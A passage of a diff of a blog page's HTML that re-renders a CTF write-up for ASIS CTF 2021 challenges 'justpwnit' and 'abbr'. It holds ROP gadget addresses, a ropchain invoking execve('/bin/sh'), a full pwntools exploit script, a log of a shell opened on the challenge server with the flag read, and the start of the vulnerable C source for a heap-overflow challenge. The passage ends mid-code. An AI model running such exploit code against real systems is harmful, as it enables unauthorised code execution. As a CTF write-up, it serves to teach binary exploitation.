+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000406c32 : mov qword ptr [rax], rsi ; ret</span><br><span class="line">0x0000000000401001 : pop rax ; ret</span><br><span class="line">0x00000000004019a3 : pop rsi ; ret</span><br><span class="line">0x00000000004013e9 : syscall</span><br><span class="line">0x0000000000403d23 : pop rdx ; ret</span><br><span class="line">0x0000000000401b0d : pop rdi ; ret</span><br></pre></td></tr></table></figure>
 
-<span class="n">MOV_RSI_PTR_RAX</span> <span class="o">=</span> <span class="mh">0x0000000000406c32</span>
-<span class="n">PT_LOAD_W</span> <span class="o">=</span> <span class="mh">0x00000000040c240</span>
+<p>Now we just have to craft the ropchain !</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POP_RDI = <span class="number">0x0000000000401b0d</span></span><br><span class="line">POP_RDX = <span class="number">0x0000000000403d23</span></span><br><span class="line">SYSCALL = <span class="number">0x00000000004013e9</span></span><br><span class="line">POP_RAX = <span class="number">0x0000000000401001</span></span><br><span class="line">POP_RSI = <span class="number">0x00000000004019a3</span></span><br><span class="line"></span><br><span class="line">MOV_RSI_PTR_RAX = <span class="number">0x0000000000406c32</span></span><br><span class="line">PT_LOAD_W = <span class="number">0x00000000040c240</span></span><br><span class="line"></span><br><span class="line">pld = pwn.p64(<span class="number">0</span>) + pwn.p64(POP_RSI) + <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">pld += pwn.p64(POP_RAX) + pwn.p64(PT_LOAD_W)</span><br><span class="line">pld += pwn.p64(MOV_RSI_PTR_RAX)</span><br><span class="line">pld += pwn.p64(POP_RAX) + pwn.p64(<span class="number">0x3b</span>)</span><br><span class="line">pld += pwn.p64(POP_RDI) + pwn.p64(PT_LOAD_W)</span><br><span class="line">pld += pwn.p64(POP_RSI) + pwn.p64(<span class="number">0</span>)</span><br><span class="line">pld += pwn.p64(POP_RDX) + pwn.p64(<span class="number">0x0</span>)</span><br><span class="line">pld += pwn.p64(SYSCALL)</span><br></pre></td></tr></table></figure>
 
-<span class="n">pld</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span>
-<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RAX</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">PT_LOAD_W</span><span class="p">)</span>
-<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">MOV_RSI_PTR_RAX</span><span class="p">)</span>
-<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RAX</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">)</span>
-<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">PT_LOAD_W</span><span class="p">)</span>
-<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
-<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDX</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
-<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
-</code></pre></div><p>And we can enjoy the shell !</p>
-<pre tabindex="0"><code>➜  justpwnit git:(master) ✗ python3 exploit.py HOST=168.119.108.148 PORT=11010
-[*] '/home/nasm/pwn/asis2021/justpwnit/justpwnit'
-    Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX enabled
-    PIE:      No PIE (0x400000)
-[+] Opening connection to 168.119.108.148 on port 11010: Done
-[*] Switching to interactive mode
-$ id
-uid=999(pwn) gid=999(pwn) groups=999(pwn)
-$ ls
-chall
-flag-69a1f60d8055c88ea27fed1ab926b2b6.txt
-$ cat flag-69a1f60d8055c88ea27fed1ab926b2b6.txt
-ASIS{p01nt_RSP_2_h34p!_RHP_1n5t34d_0f_RSP?}
-</code></pre><div class="gblog-post__anchorwrap">
-    <h2 id="full-exploit">
-        Full exploit
-        <a data-clipboard-text="https://nasm.re/posts/pwnasis/#full-exploit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Full exploit" href="#full-exploit">
-            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
-        </a>
-    </h2>
-</div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python</span>
-<span class="c1"># -*- coding: utf-8 -*-</span>
+<p>And we can enjoy the shell !</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">➜  justpwnit git:(master) ✗ python3 exploit.py HOST=168.119.108.148 PORT=11010</span><br><span class="line">[*] &#x27;/home/nasm/pwn/asis2021/justpwnit/justpwnit&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">[+] Opening connection to 168.119.108.148 on port 11010: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ id</span><br><span class="line">uid=999(pwn) gid=999(pwn) groups=999(pwn)</span><br><span class="line">$ ls</span><br><span class="line">chall</span><br><span class="line">flag-69a1f60d8055c88ea27fed1ab926b2b6.txt</span><br><span class="line">$ cat flag-69a1f60d8055c88ea27fed1ab926b2b6.txt</span><br><span class="line">ASIS&#123;p01nt_RSP_2_h34p!_RHP_1n5t34d_0f_RSP?&#125;</span><br></pre></td></tr></table></figure>
 
-<span class="c1"># this exploit was generated via</span>
-<span class="c1"># 1) pwntools</span>
-<span class="c1"># 2) ctfinit</span>
+<h2 id="Full-exploit"><a href="#Full-exploit" class="headerlink" title="Full exploit"></a>Full exploit</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># this exploit was generated via</span></span><br><span class="line"><span class="comment"># 1) pwntools</span></span><br><span class="line"><span class="comment"># 2) ctfinit</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe  = pwn.context.binary = pwn.ELF(<span class="string">&#x27;justpwnit&#x27;</span>)</span><br><span class="line">pwn.context.delete_corefiles = <span class="literal">True</span></span><br><span class="line">pwn.context.rename_corefiles = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">host = pwn.args.HOST</span><br><span class="line">port = <span class="built_in">int</span>(pwn.args.PORT <span class="keyword">or</span> <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">local</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pwn.args.GDB:</span><br><span class="line">        <span class="keyword">return</span> pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> pwn.process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remote</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span></span><br><span class="line">    io = pwn.connect(host, port)</span><br><span class="line">    <span class="keyword">if</span> pwn.args.GDB:</span><br><span class="line">        pwn.gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pwn.args.LOCAL:</span><br><span class="line">        <span class="keyword">return</span> local(argv, *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> remote(argv, *a, **kw)</span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">source /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/Downloads/pwndbg/gdbinit.py</span></span><br><span class="line"><span class="string">set follow-fork-mode parent</span></span><br><span class="line"><span class="string">b* main</span></span><br><span class="line"><span class="string">continue</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(**<span class="built_in">locals</span>())</span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Index: &quot;</span>, <span class="string">b&quot;-2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x0000000000406c32 : mov qword ptr [rax], rsi ; ret</span></span><br><span class="line"><span class="comment"># 0x0000000000401001 : pop rax ; ret</span></span><br><span class="line"><span class="comment"># 0x00000000004019a3 : pop rsi ; ret</span></span><br><span class="line"><span class="comment"># 0x00000000004013e9 : syscall</span></span><br><span class="line"><span class="comment"># 0x0000000000403d23 : pop rdx ; ret</span></span><br><span class="line"><span class="comment"># 0x0000000000401b0d : pop rdi ; ret</span></span><br><span class="line"></span><br><span class="line">POP_RDI = <span class="number">0x0000000000401b0d</span></span><br><span class="line">POP_RDX = <span class="number">0x0000000000403d23</span></span><br><span class="line">SYSCALL = <span class="number">0x00000000004013e9</span></span><br><span class="line">POP_RAX = <span class="number">0x0000000000401001</span></span><br><span class="line">POP_RSI = <span class="number">0x00000000004019a3</span></span><br><span class="line"></span><br><span class="line">MOV_RSI_PTR_RAX = <span class="number">0x0000000000406c32</span></span><br><span class="line"></span><br><span class="line">PT_LOAD_W = <span class="number">0x00000000040c240</span></span><br><span class="line"></span><br><span class="line">pld = pwn.p64(<span class="number">0</span>) + pwn.p64(POP_RSI) + <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">pld += pwn.p64(POP_RAX) + pwn.p64(PT_LOAD_W)</span><br><span class="line">pld += pwn.p64(MOV_RSI_PTR_RAX)</span><br><span class="line">pld += pwn.p64(POP_RAX) + pwn.p64(<span class="number">0x3b</span>)</span><br><span class="line">pld += pwn.p64(POP_RDI) + pwn.p64(PT_LOAD_W)</span><br><span class="line">pld += pwn.p64(POP_RSI) + pwn.p64(<span class="number">0</span>)</span><br><span class="line">pld += pwn.p64(POP_RDX) + pwn.p64(<span class="number">0x0</span>)</span><br><span class="line">pld += pwn.p64(SYSCALL)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Data: &quot;</span>, pld)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
-<span class="kn">import</span> <span class="nn">os</span>
-<span class="kn">import</span> <span class="nn">time</span>
-<span class="kn">import</span> <span class="nn">pwn</span>
-
-
-<span class="c1"># Set up pwntools for the correct architecture</span>
-<span class="n">exe</span>  <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;justpwnit&#39;</span><span class="p">)</span>
-<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="kc">True</span>
-<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">rename_corefiles</span> <span class="o">=</span> <span class="kc">False</span>
-
-<span class="n">host</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">HOST</span>
-<span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">PORT</span> <span class="ow">or</span> <span class="mi">1337</span><span class="p">)</span>
-
-<span class="k">def</span> <span class="nf">local</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
-    <span class="s1">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
-    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
-        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
-    <span class="k">else</span><span class="p">:</span>
-        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
-
-<span class="k">def</span> <span class="nf">remote</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
-    <span class="s1">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
-    <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
-    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
-        <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
-    <span class="k">return</span> <span class="n">io</span>
-
-<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
-    <span class="s1">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
-    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
-        <span class="k">return</span> <span class="n">local</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
-    <span class="k">else</span><span class="p">:</span>
-        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
-<span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
-</span><span class="s1">source /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/Downloads/pwndbg/gdbinit.py
-</span><span class="s1">set follow-fork-mode parent
-</span><span class="s1">b* main
-</span><span class="s1">continue
-</span><span class="s1">&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>
-
-<span class="c1">#===========================================================</span>
-<span class="c1">#                    EXPLOIT GOES HERE</span>
-<span class="c1">#===========================================================</span>
-
-<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
-<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Index: &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;-2&#34;</span><span class="p">)</span>
-
-<span class="c1"># 0x0000000000406c32 : mov qword ptr [rax], rsi ; ret</span>
-<span class="c1"># 0x0000000000401001 : pop rax ; ret</span>
-<span class="c1"># 0x00000000004019a3 : pop rsi ; ret</span>
-<span class="c1"># 0x00000000004013e9 : syscall</span>
-<span class="c1"># 0x0000000000403d23 : pop rdx ; ret</span>
-<span class="c1"># 0x0000000000401b0d : pop rdi ; ret</span>
-
-<span class="n">POP_RDI</span> <span class="o">=</span> <span class="mh">0x0000000000401b0d</span>
-<span class="n">POP_RDX</span> <span class="o">=</span> <span class="mh">0x0000000000403d23</span>
-<span class="n">SYSCALL</span> <span class="o">=</span> <span class="mh">0x00000000004013e9</span>
-<span class="n">POP_RAX</span> <span class="o">=</span> <span class="mh">0x0000000000401001</span>
-<span class="n">POP_RSI</span> <span class="o">=</span> <span class="mh">0x00000000004019a3</span>
-
-<span class="n">MOV_RSI_PTR_RAX</span> <span class="o">=</span> <span class="mh">0x0000000000406c32</span>
-
-<span class="n">PT_LOAD_W</span> <span class="o">=</span> <span class="mh">0x00000000040c240</span>
-
-<span class="n">pld</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span>
-<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RAX</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">PT_LOAD_W</span><span class="p">)</span>
-<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">MOV_RSI_PTR_RAX</span><span class="p">)</span>
-<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RAX</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">)</span>
-<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">PT_LOAD_W</span><span class="p">)</span>
-<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
-<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDX</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
-<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
-
-<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Data: &#34;</span><span class="p">,</span> <span class="n">pld</span><span class="p">)</span>
-
-<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</code></pre></div><div class="gblog-post__anchorwrap">
-    <h1 id="abbr">
-        abbr
-        <a data-clipboard-text="https://nasm.re/posts/pwnasis/#abbr" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor abbr" href="#abbr">
-            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
-        </a>
-    </h1>
-</div>
-<p>abbr is very basic heap overflow, we just have to overwrite a function pointer to a stack pivot gadget with the help of a user controlled register. Then, we can drop a shell with a similar ROP as for the <code>justpwnit</code> challenge (the binary is also statically linked without the system function).</p>
+<h1 id="abbr"><a href="#abbr" class="headerlink" title="abbr"></a>abbr</h1><p>abbr is very basic heap overflow, we just have to overwrite a function pointer to a stack pivot gadget with the help of a user controlled register. Then, we can drop a shell with a similar ROP as for the <code>justpwnit</code> challenge (the binary is also statically linked without the system function).</p>
 <p>Here is the source code:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;ctype.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&#34;rules.h&#34;</span><span class="cp">
-</span><span class="cp"></span>
-<span class="k">typedef</span> <span class="k">struct</span> <span class="n">Translator</span> <span class="p">{</span>
-  <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">translate</span><span class="p">)(</span><span class="kt">char</span><span class="o">*</span><span class="p">);</span>
-  <span class="kt">char</span> <span class="o">*</span><span class="n">text</span><span class="p">;</span>
-  <span class="kt">int</span> <span class="n">size</span><span class="p">;</span>
-<span class="p">}</span> <span class="n">Translator</span><span class="p">;</span>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;rules.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Translator</span> &#123;</span></span><br><span class="line">  <span class="type">void</span> (*translate)(<span class="type">char</span>*);</span><br><span class="line">  <span class="type">char</span> *text;</span><br><span class="line">  <span class="type">int</span> size;</span><br><span class="line">&#125; Translator;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">english_expand</span><span class="params">(<span class="type">char</span> *text)</span> &#123;</span><br><span class="line">  <span class="type">int</span> i, alen, blen;</span><br><span class="line">  Rule *r;</span><br><span class="line">  <span class="type">char</span> *p, *q;</span><br><span class="line">  <span class="type">char</span> *end = &amp;text[<span class="built_in">strlen</span>(text)<span class="number">-1</span>]; <span class="comment">// pointer to the last character</span></span><br><span 